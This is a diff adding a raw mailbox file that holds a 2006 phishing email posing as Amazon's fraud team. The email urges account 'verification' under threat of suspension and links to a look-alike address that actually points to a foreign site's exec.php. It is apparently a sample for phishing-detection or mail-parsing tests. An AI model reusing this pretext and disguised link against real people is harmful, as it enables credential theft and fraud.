@@ -1,0 +1,80 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <store-news@amazon.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 609F847EC2
+ for <user@login.example.com>; Sun,  3 Dec 2006 16:32:42 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 57D34131F716
+ for <user@example.com>; Sun,  3 Dec 2006 16:32:42 -0500 (EST)
+Received: from ns3.clss.com (unknown [209.120.128.97])
+ by mail.example.org (Postfix) with ESMTP id D61706FD0D1
+ for <user@example.com>; Sat,  2 Dec 2006 17:58:46 -0500 (EST)
+Received: (qmail 18812 invoked from network); 1 Dec 2006 13:13:41 -0500
+Received: from unknown (HELO User) (125.5.111.163)
+ by 209.120.128.97 with SMTP; 1 Dec 2006 13:13:41 -0500
+Reply-To: <no.reply@amazon.com>
+From: "Amazon"<store-news@amazon.com>
+Subject: Account Notification:Your Online Account Needs Re-activation.
+Date: Sat, 2 Dec 2006 03:12:21 +0900
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20061202225846.D61706FD0D1@mail.example.org>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 468
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<p><img src="http://g-images.amazon.com/images/G/04/icons/amazon-logo.gif"></p>
+<p>***Urgent Fraud Prevention Group Notice*** </p>
+<p></p>
+<p></p>
+<p>You have received this email because we have strong reason to believe that 
+  your Amazon account had been recently compromised. In order to prevent any fraudulent 
+  activity from occurring we are required to open an investigation into this matter. 
+  To speed up this process, you are required to verify your Amazon account by 
+  following the link below. </p>
+<p><br>
+  <a href="http://lamanchavillas.com/www.amazon.com/flex/sign-out.html/2Fhomepage&protocol=httpsaction=sign-out/exec.php?cmd=sign-in">https://s1.amazon.com/exec/varzea/register/login/103-4581464-2644632</a> 
+  <br>
+  (To complete the verification process you must fill in all the required fields) 
+</p>
+<p><br>
+  Please Note: If your account informations are not updated within the next 12 
+  hours, then we will assume this account is fraudulent and will be suspended. 
+  We apologize for this inconvenience, but the purpose of this verification is 
+  to ensure that your Amazon account has not been fraudulently used and to combat 
+  fraud. </p>
+<p><br>
+  We appreciate your support and understanding, as we work together to keep Amazon 
+  a safe place to trade. </p>
+<p>Thank you for your attention on this serious matter. We apologize for any delay 
+  in resolving this situation. </p>
+Regards,<br>
+<br>
+Amazon.com<br>
+Investigations Team <br>
+<br>
+Please do not reply to this e-mail as this is only a notification. Mail sent to 
+this address cannot be answered. <br>
+Amazon.com treats your personal information with the utmost care, and our Privacy 
+Policy is designed to protect you and your information.<br>
+Copyright &copy; 2006 Amazon.com All Rights Reserved.
+</body>
+</html>
